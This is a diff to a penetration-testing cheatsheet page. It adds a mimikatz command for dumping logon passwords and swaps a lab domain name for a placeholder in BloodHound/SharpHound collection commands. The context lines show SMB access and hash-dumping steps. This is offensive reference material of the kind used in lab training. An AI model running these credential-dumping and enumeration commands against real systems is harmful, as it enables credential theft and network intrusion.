@@ -1,4 +1,3 @@
-+++
 title = "OLD Cyber Cheatsheet"
 type = "home"
 +++
@@ -563,6 +562,9 @@ smbclient -N //<TARGET_IP>/Public
 cd Downloads
 .\mimikatz.exe
 privilege::debug
+
+# Dumps all
+sekurlsa::logonpasswords
 
 # Dump Hashes
 lsadump::lsa /patch
@@ -2385,11 +2387,11 @@ Get-NetGroup -GroupName *admin*
 # Bloodhound/SharpHound - AD Mapping
 powershell -ep bypass
 . .\Downloads\SharpHound.ps1    
-Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
+Invoke-Bloodhound -CollectionMethod All -Domain <DOMAIN> -ZipFileName loot.zip
 # - OR
 
 # SharpHound.exe alternative
-.\SharpHound.exe -c All -d CONTROLLER.local --zipfilename loot_exe.zip
+.\SharpHound.exe -c All -d <DOMAIN> --zipfilename loot_exe.zip
 
 # Transfer Bloodhound data to attacker
 # Upload zipfile to Bloodhound: http://127.0.0.1:8080/ui/login
